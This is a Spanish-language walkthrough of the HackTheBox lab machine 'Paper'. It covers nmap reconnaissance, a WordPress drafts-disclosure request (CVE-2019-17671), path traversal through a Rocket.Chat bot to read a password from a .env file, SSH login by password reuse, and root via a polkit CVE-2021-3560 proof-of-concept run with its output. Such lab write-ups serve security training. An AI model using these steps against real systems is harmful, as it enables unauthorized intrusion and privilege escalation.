Propiedades:
- OS: Linux
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #wordpress #path-traversal #rocket-chat #polkit #CVE-2021-3560 #password-reuse #CVE-2019-17671

![](assets/Pasted%20image%2020251223202636.png)

## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

- ttl 63 indica maquina linux

```bash
> ping -c 1 10.129.13.247
PING 10.129.13.247 (10.129.13.247) 56(84) bytes of data.
64 bytes from 10.129.13.247: icmp_seq=1 ttl=63 time=262 ms

--- 10.129.13.247 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 261.892/261.892/261.892/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
> sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.13.247
-----------------------------------------------------------------
Host is up, received user-set (0.088s latency).
Scanned at 2025-12-23 20:28:26 CST for 11s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```

- Puertos 22, 80 y 443 abiertos.

Sobre los puertos abiertos realizo un segundo escaneo para detectar versiones, servicios y correr un conjunto de scripts de reconocimiento.

```bash
> sudo nmap -p 22,80,443 -sCV -Pn -n -sS -vvv 10.129.13.247 -oA nmap/target
----------------------------------------------------------------------------
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcZzzauRoUMdyj6UcbrSejflBMRBeAdjYb2Fkpkn55uduA3qShJ5SP33uotPwllc3wESbYzlB9bGJVjeGA2l+G99r24cqvAsqBl0bLStal3RiXtjI/ws1E3bHW1+U35bzlInU7AVC9HUW6IbAq+VNlbXLrzBCbIO+l3281i3Q4Y2pzpHm5OlM2mZQ8EGMrWxD4dPFFK0D4jCAKUMMcoro3Z/U7Wpdy+xmDfui3iu9UqAxlu4XcdYJr7Iijfkl62jTNFiltbym1AxcIpgyS2QX1xjFlXId7UrJOJo3c7a0F+B3XaBK5iQjpUfPmh7RLlt6CZklzBZ8wsmHakWpysfXN
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE/Xwcq0Gc4YEeRtN3QLduvk/5lezmamLm9PNgrhWDyNfPwAXpHiu7H9urKOhtw9SghxtMM2vMIQAUh/RFYgrxg=
|   256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKdmmhk1vKOrAmcXMPh0XRA5zbzUHt1JBbbWwQpI4pEX
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-title: 400 Bad Request
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain
| Subject Alternative Name: DNS:localhost.localdomain
| Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain/organizationalUnitName=ca-3899279223185377061
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-07-03T08:52:34
| Not valid after:  2022-07-08T10:32:34
| MD5:   579a:92bd:803c:ac47:d49c:5add:e44e:4f84
| SHA-1: 61a2:301f:9e5c:2603:a643:00b5:e5da:5fd5:c175:f3a9
| -----BEGIN CERTIFICATE-----
| MIIE4DCCAsigAwIBAgIIdryw6eirdUUwDQYJKoZIhvcNAQELBQAwgY8xCzAJBgNV
| BAYTAlVTMRQwEgYDVQQKDAtVbnNwZWNpZmllZDEfMB0GA1UECwwWY2EtMzg5OTI3
| OTIyMzE4NTM3NzA2MTEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw
| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjAeFw0yMTA3
| MDMwODUyMzRaFw0yMjA3MDgxMDMyMzRaMG4xCzAJBgNVBAYTAlVTMRQwEgYDVQQK
| DAtVbnNwZWNpZmllZDEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw
| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAL1/3n1pZvFgeX1ja/w84jNxT2NcBkux
| s5DYnYKeClqncxe7m4mz+my4uP6J1kBP5MudLe6UE62KFX3pGc6HCp2G0CdA1gQm
| 4WYgF2E7aLNHZPrKQ+r1fqBBw6o3NkNxS4maXD7AvrCqkgpID/qSziMJdUzs9mS+
| NTzWq0IuSsTztLpxUEFv7T6XPGkS5/pE2hPWO0vz/Bd5BYL+3P08fPsC0/5YvgkV
| uvFbFrxmuOFOTEkrTy88b2fLkbt8/Zeh4LSdmQqriSpxDnag1i3N++1aDkIhAhbA
| LPK+rZq9PmUUFVY9MqizBEixxRvWhaU9gXMIy9ZnPJPpjDqyvju5e+kCAwEAAaNg
| MF4wDgYDVR0PAQH/BAQDAgWgMAkGA1UdEwQCMAAwIAYDVR0RBBkwF4IVbG9jYWxo
| b3N0LmxvY2FsZG9tYWluMB8GA1UdIwQYMBaAFBB8mEcpW4ZNBIaoM7mCF/Z+7ffA
| MA0GCSqGSIb3DQEBCwUAA4ICAQCw4uQfUe+FtsPdT0eXiLHg/5kXBGn8kfJZ45hP
| gcuwa5JfAQeA3JXx7piTSiMMk0GrWbqbrpX9ZIkwPnZrN+9PV9/SNCEJVTMy+LDQ
| QGsyqwkZpMK8QThzxRvXvnyf3XeEFDL6N4YeEzWz47VNlddeqOBHmrDI5SL+Eibh
| wxNj9UXwhEySUpgMAhU+QtXk40sjgv4Cs3kHvERvpwAfgRA7N38WY+njo/2VlGaT
| qP+UekP42JveOIWhf9p88MUmx2QqtOq/WF7vkBVbAsVs+GGp2SNhCubCCWZeP6qc
| HCX0/ipKZqY6zIvCcfr0wHBQDY9QwlbJcthg9Qox4EH1Sgj/qKPva6cehp/NzsbS
| JL9Ygb1h65Xpy/ZwhQTl+y2s+JxAoMy3k50n+9lzCFBiNzPLsV6vrTXCh7t9Cx07
| 9jYqMiQ35cEbQGIaKQqzguPXF5nMvWDBow3Oj7fYFlCdLTpaTjh8FJ37/PrhUWIl
| Li+WW8txrQKqm0/u1A41TI7fBxlUDhk6YFA+gIxX27ntQ0g+lLs8rwGlt/o+e3Xa
| OfcJ7Tl0ovWa+c9lWNju5mgdU+0v4P9bqv4XcIuyE0exv5MleA99uOYE1jlWuKf1
| m9v4myEY3dzgw3IBDmlYpGuDWQmMYx8RVytYN3Z3Z64WglMRjwEWNGy7NfKm7oJ4
| mh/ptg==
|_-----END CERTIFICATE-----
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
```

- El sistema es un CentOs
- Puerto 22 SSH: OpenSSH 8.0
- Puerto 80 HTTP: Apache httpd 2.4.37
- Puerto 443 HTTP: Apache httpd 2.4.37

## Enumeración

### Puerto 80 HTTP

Aqui simplemente reside la pagina de test de apache:

![](assets/Pasted%20image%2020251223203957.png)

**Headers.**

Analizando los headers podemos ver lo siguiente

- Backend Server: office.paper, al parecer es un subdominio.

```bash
> curl http://10.129.13.247/ -I
HTTP/1.1 403 Forbidden
Date: Wed, 24 Dec 2025 03:08:35 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
ETag: "30c0b-5c5c7fdeec240"
Accept-Ranges: bytes
Content-Length: 199691
Content-Type: text/html; charset=UTF-8
```

Metemos el subdominio al `/etc/hosts`

```bash
> sudo nano /etc/hosts
10.129.13.247 office.paper
```

### Subdominio office.paper

La pagina es sobre una compañía de papeles

![](assets/Pasted%20image%2020251223211158.png)

Podemos ver varios Posts de un usuario llamado Prisonmike

![](assets/Pasted%20image%2020251223211343.png)

También podemos ver un comentario de un presunto trabajador.

![](assets/Pasted%20image%2020251223211722.png)

**Tecnologias Web.**

Wappalyzer detecta que esto es un Wordpress 

![](assets/Pasted%20image%2020251223211219.png)

Lo comprobamos accediendo al `wp-admin`

![](assets/Pasted%20image%2020251223211303.png)

**Wpscan.**

Utilice `Wpscan` para escanear el wordpress completo:

```bash
> wpscan --url http://office.paper/ -e vp,u --api-token="token"
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart'
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]n
[+] URL: http://office.paper/ [10.129.13.247]
[+] Started: Tue Dec 23 21:15:48 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |  - X-Powered-By: PHP/7.2.24
 |  - X-Backend-Server: office.paper
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://office.paper/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-04).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |
 
[i] User(s) Identified:

[+] prisonmike
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] nick
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] creedthoughts
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

- Tenemos la version de wordpress 5.2.3 que tiene 32 vulnerabilidades 
- Tenemos los usuarios creedthoughts, nick y prisonmike. prisonmike es el usuario de los posts y creedthoughts es el trabajador de los comentarios.

## Explotación

La version de Wordpress 5.2.3 es vulnerable al [CVE-2019-17671](https://nvd.nist.gov/vuln/detail/CVE-2019-17671) que basicamente nos permite ver drafts y contenido privado.

Solo tenemos que hacer un curl y jugar con los parámetros de static y order.

- El output de esto es bastante grande por lo cual solo colocare las partes importantes

```bash
> curl http://office.paper/?static=1&order=asc
--------------------------------------------------
<p>Hello employees of Blunder Tiffin,</p>
<p>Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.</p>
<p>So, I kindly request you all to take your discussions from the public blog to a more private chat system.</p>
<p>Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt&#8230;.</p>

<p># Secret Registration URL of new Employee chat system</p>
<p>http://chat.office.paper/register/8qozr226AhkCHZdyY</p>
```

- Podemos ver el nuevo subdominio `chat.office.paper` donde esta el nuevo chat privado del que hablaban antes.


Metí el subdominio al `/etc/hosts` y me dirigo a la url `http://chat.office.paper/register/8qozr226AhkCHZdyY` para crearme una cuenta.

![](assets/Pasted%20image%2020251223212542.png)

Al entrar me encuentro con un chat general y un bot que ejecuta comandos y al cual le puedo enviar mensaje directo.

![](assets/Pasted%20image%2020251223213437.png)

El bot me permite listar directorios y ver archivos usando `list`, `file` y pasándole la ruta. 

![](assets/Pasted%20image%2020251223214459.png)

Puedo hacer PathTraversal para listar otros directorios, en este caso el home.

![](assets/Pasted%20image%2020251223214825.png)

Después de buscar entre la multitud de archivos, me encuentro con un `.env` en la carpeta de `hubot`

- Veo una password Queenofblad3s!23 

![](assets/Pasted%20image%2020251223215150.png)

Se que existe el usuario dwight por lo cual puedo tratar de reutilizar la password en el `SSH`.

- dwight:Queenofblad3s!23

```bash
ssh dwight@10.129.13.247
dwight@10.129.13.247's' password: 
Activate the web console with: systemctl enable --now cockpit.socket

Last failed login: Tue Dec 23 22:43:27 EST 2025 from 10.10.15.110 on ssh:notty
There were 2 failed login attempts since the last successful login.
Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$ id
uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
```

## Escalada de Privilegios

Enumere el sistema manualmente pero no encontré nada raro. Estuve husmeando en el directorio donde se instalo `Rocket.chat` pero tampoco encontré nada, en cuanto a puertos y servicios locales encontré que corría `mongodb` al cual pude acceder sin credenciales pero no existía ninguna `db`.

```bash
[dwight@paper ~]$ sudo -l # Sin exito
[dwight@paper ~]$ find / -perm -4000 2>/dev/null # Nada raro
```

Por lo cual utilice `linpeas.sh` 

- Linpeas detecto que la maquina era vulnerable al [CVE-2021-3560](https://nvd.nist.gov/vuln/detail/cve-2021-3560).

```bash
[dwight@paper shm]$ ./linpeas.sh

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)


Vulnerable to CVE-2021-3560

```

**Polkit** es un componente fundamental en sistemas operativos tipo Unix (como Linux) que controla los permisos, permitiendo que aplicaciones sin privilegios interactúen con servicios privilegiados de forma segura y centralizada. Polkit es un proceso en segundo plano y es basicamente quien te popea la pantalla de "Autenticación Requerida" cuando realizas alguna acciona.  

- Utilice este [PoC](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation). **Polkit tiene un error de tiempo (race condition).**  Un usuario normal envía una solicitud por D-Bus para crear un usuario.  Antes de que polkit termine de comprobar los permisos, la conexión se corta a propósito.  Debido a este fallo, polkit no valida correctamente quién hizo la solicitud y **permite que la acción continúe como root**, creando un nuevo usuario con privilegios administrativos.

```bash
bash[dwight@paper shm]$ bash poc.sh

[!] Username set as : secnigma
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as "centos"
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username secnigma...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username secnigma  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using su - secnigma
[!] When prompted for password, enter your password 
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!

```

Podemos ver que el usuario tiene permisos `10(wheel)` (root).

```bash
[dwight@paper shm]$ su - secnigma
Password: 
[secnigma@paper ~]$ id
uid=1005(secnigma) gid=1005(secnigma) groups=1005(secnigma),10(wheel)
```

Por lo cual ahora podemos spawnear una bash como root.

```bash
[secnigma@paper ~]$ sudo bash
[sudo] password for secnigma: 

[root@paper secnigma]# cd /root
[root@paper ~]# cat root.txt
38d4d24db1*******
```

***PWNED***

![](assets/Pasted%20image%2020251223225207.png)
